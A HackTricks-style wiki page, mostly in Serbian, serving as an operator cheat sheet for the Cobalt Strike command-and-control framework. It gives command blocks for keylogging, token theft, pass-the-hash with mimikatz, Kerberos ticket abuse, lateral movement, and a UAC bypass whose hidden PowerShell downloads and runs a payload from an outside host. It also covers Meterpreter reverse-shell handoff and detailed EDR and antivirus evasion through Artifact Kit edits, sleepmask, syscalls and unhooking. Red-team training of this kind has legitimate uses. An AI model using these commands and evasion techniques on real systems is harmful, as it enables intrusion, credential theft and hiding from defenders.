# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` zatim možete da izaberete gde će se osluškivati, koju vrstu beacon-a koristiti (http, dns, smb...) i još mnogo toga.

### Peer2Peer Listeners

Beacon-i ovih listener-a ne moraju direktno da komuniciraju sa C2 serverom; mogu da komuniciraju s njim preko drugih beacon-a.

`Cobalt Strike -> Listeners -> Add/Edit` zatim treba da izaberete TCP ili SMB beacon-e

* **TCP beacon će postaviti listener na izabranom portu**. Da biste se povezali sa TCP beacon-om, upotrebite komandu `connect <ip> <port>` iz drugog beacon-a
* **smb beacon će osluškivati na imenovanom pipe-u**. Da biste se povezali sa SMB beacon-om, upotrebite komandu `link [target] [pipe]`.

### Generisanje i hostovanje payload-a

#### Generisanje payload-a u datotekama

`Attacks -> Packages ->`

* **`HTMLApplication`** za HTA datoteke
* **`MS Office Macro`** za Office dokument sa makroom
* **`Windows Executable`** za .exe, .dll ili service .exe
* **`Windows Executable (S)`** za **stageless** .exe, .dll ili service .exe (stageless je bolji od staged, jer ostavlja manje IoC-ova)

#### Generisanje i hostovanje payload-a

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Ovo će generisati skriptu/izvršnu datoteku za preuzimanje beacon-a sa Cobalt Strike-a u formatima kao što su bitsadmin, exe, powershell i python

#### Hostovanje payload-a

Ako već imate datoteku koju želite da hostujete na web serveru, idite na `Attacks -> Web Drive-by -> Host File`, pa izaberite datoteku za hostovanje i konfiguraciju web servera.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Prilagođeni implantati / Linux Beacons

- Prilagođeni agent treba samo da komunicira pomoću HTTP/S protokola Cobalt Strike Team Servera (podrazumevani malleable C2 profil) da bi se registrovao/proverio i primao zadatke. Implementirajte iste URI-jeve, zaglavlja i kriptografiju metapodataka definisane profilom da biste ponovo koristili Cobalt Strike UI za zadavanje zadataka i prikaz izlaza.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (npr. `CustomBeacon.cna`) može da obuhvati generisanje payload-a za Beacon koji nije namenjen Windows-u, tako da operateri mogu da izaberu listener i direktno iz GUI-ja naprave ELF payload-e.
- Primeri Linux rukovalaca zadacima dostupnih preko Team Servera: `sleep`, `cd`, `pwd`, `shell` (izvršavanje proizvoljnih komandi), `ls`, `upload`, `download` i `exit`. Oni se mapiraju na ID-jeve zadataka koje očekuje Team Server i moraju biti implementirani na strani servera da bi vratili izlaz u odgovarajućem formatu.
- Podrška za BOF na Linux-u može se dodati učitavanjem Beacon Object Files u isti proces pomoću [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (podržava i BOF-ove u Outflank stilu), što omogućava modularni post-exploitation u kontekstu/sa privilegijama implanta, bez pokretanja novih procesa.<sup>[[2]](#references)[[3]](#references)</sup>
  Informacije o formatima loader-a za Linux i ograničenjima granica procesa, uz primer zadavanja BOF zadataka, potražite u tekstu [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Ugradite SOCKS handler u prilagođeni Beacon da biste zadržali iste mogućnosti pivotovanja kao kod Windows Beacon-ova: kada operater pokrene `socks <port>`, implant treba da otvori lokalni proxy za usmeravanje alata operatera preko kompromitovanog Linux hosta u interne mreže.

## Opsec

### Execute-Assembly

Komanda **`execute-assembly`** koristi **žrtveni proces** za izvršavanje navedenog programa putem udaljene injekcije procesa. Ovo je veoma upadljivo jer se za injektovanje u proces koriste određeni Win API-ji koje proverava svaki EDR. Ipak, postoje prilagođeni alati pomoću kojih se sadržaj može učitati u isti proces:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- U Cobalt Strike-u možete koristiti i BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Script `https://github.com/outflanknl/HelpColor` kreira komandu `helpx` u Cobalt Strike-u, koja bojama označava komande: BOF-ovi su zeleni, Frok&Run i slične komande žute, a ProcessExecution, injekcija i slične komande crvene. To pomaže da se utvrdi koje su komande prikrivenije.

### Savremeni post-execution u istom procesu

Novije verzije dodaju dve alternative kada klasični COFF BOF ima previše ograničenja:

- **Beacon Interpreter** kompajlira C na Team Serveru u međukod i izvršava ga u VM-u ugrađenom u Beacon. Međukod ostaje podatak, a ne izvorni izvršni kod, čime se izbegavaju dodatna alokacija izvršnog memorijskog prostora i prelaz dozvola sa RW na RX koji su obično potrebni za učitavanje BOF-a. Skripte mogu da uvezu Beacon API i deklarišu prototipove za BOF-style Dynamic Function Resolution (DFR).
- **BOF-PE** učitava kompletan EXE ili DLL u trenutni Beacon. Ovaj format podržava uobičajene PE importe, obradu izuzetaka, napredniji C++ i spoljne biblioteke, uz zadržavanje Beacon API-ja. Zahtevniji je od malog COFF BOF-a, pa ga birajte samo kada su dodatne runtime mogućnosti korisne.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Ovi mehanizmi smanjuju signale povezane sa loaderom, ali ne i telemetriju koju generišu radnje skripte ili pozivi Windows API-ja.<sup>[[8]](#references)</sup>

### Delujte kao korisnik

Možete proveriti događaje kao što su `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Proverite sva interaktivna prijavljivanja da biste saznali uobičeno radno vreme.
- System EID 12,13 - Proverite učestalost gašenja/pokretanja/stanja mirovanja.
- Security EID 4624/4625 - Proverite dolazne uspešne/neuspešne NTLM pokušaje.
- Security EID 4648 - Ovaj događaj se kreira kada se za prijavljivanje koriste akreditivi u čistom tekstu. Ako ga je generisao proces, binarna datoteka potencijalno sadrži akreditive u čistom tekstu u konfiguracionoj datoteci ili kodu.

Kada koristite `jump` iz Cobalt Strike-a, bolje je koristiti metod `wmi_msbuild` kako bi novi proces delovao legitimnije.

### Koristite računare kao naloge

Uobičajeno je da branioci proveravaju sumnjiva ponašanja korisnika, a da **izuzimaju servisne naloge i računarske naloge kao što je `*$` iz svog nadzora**. Ove naloge možete koristiti za lateralno kretanje ili eskalaciju privilegija.

### Koristite stageless payload-e

Stageless payload-i su manje uočljivi od staged payload-a jer ne moraju da preuzimaju drugu fazu sa C2 servera. To znači da ne generišu mrežni saobraćaj nakon početne veze, pa je manja verovatnoća da će ih otkriti mrežne odbrane.

### Tokeni i Token Store

Budite oprezni pri krađi ili generisanju tokena jer EDR može da nabraja thread tokene i otkrije **token koji pripada drugom korisniku** ili čak nalogu SYSTEM unutar procesa.

Ovo omogućava čuvanje tokena **za svaki beacon**, pa nije potrebno krasti isti token iznova. To je korisno za lateralno kretanje ili kada ukradeni token treba da koristite više puta:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Pri lateralnom kretanju obično je bolje **ukrasti token nego generisati novi** ili izvršiti pass the hash napad.

### Guardrails

Cobalt Strike ima funkciju pod nazivom **Guardrails** koja pomaže u sprečavanju korišćenja određenih komandi ili radnji koje bi branioci mogli da otkriju. Guardrails se mogu podesiti tako da blokiraju određene komande, kao što su `make_token`, `jump`, `remote-exec` i druge koje se često koriste za lateralno kretanje ili eskalaciju privilegija.

Pored toga, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) sadrži i neke provere i ideje koje možete razmotriti pre izvršavanja payload-a.

### Šifrovanje tiketa

U AD okruženju obratite pažnju na šifrovanje tiketa. Neki alati podrazumevano koriste RC4 za Kerberos tikete, što je manje bezbedno od AES-a; ažurirana okruženja podrazumevano koriste AES. Branioci koji nadziru slabe algoritme šifrovanja mogu to da otkriju.

### Izbegavajte podrazumevane vrednosti

Kada koristite Cobalt Strike, SMB pipe-ovi se podrazumevano zovu `msagent_####` i `"status_####`. Promenite te nazive. Postojeće nazive pipe-ova u Cobalt Strike-u možete proveriti komandom: `ls \\.\pipe\`

Pored toga, SSH sesije kreiraju pipe pod nazivom `\\.\pipe\postex_ssh_####`. Promenite ga pomoću `set ssh_pipename "<new_name>";`.

Isto tako, u napadu post-exploitation, pipe-ovi `\\.\pipe\postex_####` mogu se izmeniti pomoću `set pipename "<new_name>"`.

U Cobalt Strike profilima možete izmeniti i sledeće:

- Izbegavanje korišćenja `rwx`
- Način rada process injection-а (koji će se API-ji koristiti) u bloku `process-inject {...}`
- Način rada „fork and run“ u bloku `post-ex {…}`
- Vreme spavanja
- Maksimalnu veličinu binarnih datoteka koje se učitavaju u memoriju
- Memorijski otisak i sadržaj DLL-a pomoću bloka `stage {...}`
- Mrežni saobraćaj

### Sleepmask i BeaconGate

Sleepmask transformiše Beacon i alokacije heap-a koje prati dok miruje, a zatim ih vraća u prvobitno stanje radi izvršavanja zadataka. Aktuelna izdanja podrazumevano koriste evazivno ponašanje, ali prilagođeni Sleepmask BOF-ovi su i dalje korisni kada se zahtevi razlikuju u pogledu rasporeda memorije, alokacija ili steka poziva. Od verzije 4.13, podrazumevani Sleepmask lažira i povratnu adresu za API-je kojima se pristupa preko BeaconGate-a.<sup>[[8]](#references)</sup>

**BeaconGate** proširuje ovaj pristup i van funkcije `Sleep`: izabrani WinAPI pozivi predstavljeni su strukturama `FUNCTION_CALL` i prosleđuju se Sleepmask BOF-u, koji može da prikrije Beacon tokom izvršavanja poziva. Profil može da usmeri grupu (`Comms`, `Core`, `Cleanup` ili `All`) ili samo pojedinačne API-je:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

Za API naveden pod `beacon_gate`, gate ima prednost nad `syscall_method`; API-ji koji nisu navedeni i dalje mogu da koriste konfigurisani syscall metod. `beacon_gate disable` i `beacon_gate enable` uključuju i isključuju ovu funkciju tokom rada. Izbegavajte da naslepo uključite `All`: komande kao što je `ps` više puta pozivaju `OpenProcess`/`CloseHandle` i mogu da izazovu skok opterećenja CPU-a kada svaki poziv maskira i demaskira Beacon. Sleepmask-VS obezbeđuje simulirano stanje Beacon/Sleepmask za otklanjanje grešaka u prilagođenim gate-ovima bez njihovog stalnog testiranja putem aktivnog implanta.<sup>[[9]](#references)</sup>

### Noisy proc injections

Ubacivanje koda u proces je obično veoma upadljivo, jer **nijedan uobičajen proces obično ne obavlja ovu radnju, a mogućnosti za njeno izvođenje su veoma ograničene**. Zato ga sistemi za detekciju zasnovani na ponašanju mogu otkriti. Štaviše, EDR-ovi ga mogu otkriti skeniranjem mreže u potrazi za **nitima koje sadrže kod koji nije na disku** (mada je to uobičajeno kod procesa kao što su pregledači koji koriste JIT). Primer: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID i PPID odnosi

Prilikom pokretanja novog procesa važno je **održavati uobičajen odnos roditelj–dete** između procesa kako bi se izbeglo otkrivanje. Ako svchost.exe pokreće iexplorer.exe, to će izgledati sumnjivo jer svchost.exe nije roditeljski proces iexplorer.exe u uobičajenom Windows okruženju.

Kada se u Cobalt Strike-u pokrene novi beacon, podrazumevano se kreira proces koji koristi **`rundll32.exe`** za pokretanje novog listener-a. Ovo nije naročito prikriveno i EDR-ovi to lako mogu da otkriju. Štaviše, `rundll32.exe` se pokreće bez ikakvih argumenata, što deluje još sumnjivije.

Pomoću sledeće Cobalt Strike komande možete da odredite drugi proces za pokretanje novog beacon-a, čime se smanjuje mogućnost njegovog otkrivanja:

```bash
spawnto x86 svchost.exe
```

Možete promeniti i ovu postavku **`spawnto_x86` i `spawnto_x64`** u profilu.

### Proxyovanje saobraćaja napadača

Napadači ponekad moraju da pokreću alate lokalno, čak i na Linux mašinama, i da usmere saobraćaj žrtava do alata (npr. NTLM relay).

Pored toga, ponekad je za pass-the.hash ili pass-the-ticket napad skrivenije da napadač **lokalno doda ovaj hash ili ticket u sopstveni LSASS proces**, pa zatim pivotira sa njega umesto da menja LSASS proces na mašini žrtve.

Međutim, morate biti **oprezni sa generisanim saobraćajem**, jer možda šaljete neuobičajen saobraćaj (Kerberos?) iz svog backdoor procesa. U tom slučaju možete pivotirati na proces pregledača (mada vas mogu uhvatiti dok se ubacujete u proces, zato razmislite kako da to uradite prikriveno).

### Izbegavanje AV-a

#### Zaobilaženje AV/AMSI/ETW-a

Pogledajte stranicu:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i unapred kompajlirane šablone (u `/src-common`) payload-ova koje će cobalt strike koristiti za generisanje binarnih beacona.

Pomoću alata [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), uz generisani backdoor (ili samo kompajlirani šablon), možete pronaći šta pokreće Defender-ovu detekciju. Obično je to string. Zato možete jednostavno izmeniti kod koji generiše backdoor tako da se taj string ne pojavi u konačnom binarnom fajlu.

Kada izmenite kod, pokrenite `./build.sh` iz istog direktorijuma i kopirajte fasciklu `dist-pipe/` u Windows klijent, u `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Ne zaboravite da učitate aggressive script `dist-pipe\artifact.cna` kako biste naznačili Cobalt Strike-u da koristi željene resurse sa diska, a ne one koji su već učitani.

#### Komplet resursa

Fascikla ResourceKit sadrži predloške za Cobalt Strike payload-ove zasnovane na skriptama, uključujući PowerShell, VBA i HTA.

Pomoću [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) i ovih predložaka možete da otkrijete šta se ne dopada defender-u (u ovom slučaju, AMSI) i da to izmenite:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifikovanjem detektovanih linija može se generisati šablon koji neće biti otkriven.

Ne zaboravite da učitate agresivnu skriptu `ResourceKit\resources.cna` kako biste naznačili Cobalt Strike-u da koristi željene resurse sa diska, a ne učitane resurse.

#### Hook-ovi funkcija | Syscall

Hookovanje funkcija je veoma česta metoda koju EDR-ovi koriste za otkrivanje zlonamernih aktivnosti. Cobalt Strike omogućava zaobilaženje ovih hook-ova korišćenjem **syscalls** umesto standardnih poziva Windows API-ja, pomoću konfiguracije **`None`**; korišćenjem verzije funkcije `Nt*` uz podešavanje **`Direct`**; ili jednostavnim preskakanjem funkcije `Nt*` uz opciju **`Indirect`** u malleable profilu. U zavisnosti od sistema, jedna opcija može biti neupadljivija od druge.

Ovo se može podesiti u profilu ili pomoću komande **`syscall-method`**.

Međutim, ovo takođe može biti upadljivo.

Jedna od opcija koju Cobalt Strike nudi za zaobilaženje hook-ova funkcija jeste njihovo uklanjanje pomoću: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Možete i da proverite koje su funkcije hook-ovane pomoću [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ili [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Razne Cobalt Strike komande</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Linux Beacon za Cobalt Strike (PoC prilagođenog implantata)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader i Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF šablon](https://github.com/outflanknl/nix_bof_template)
- [4] [Analiza Unit42 enkripcije metapodataka u Cobalt Strike-u](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Dnevnik SANS ISC o Cobalt Strike saobraćaju](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Izgubljeni u prevodu](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Kroz BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
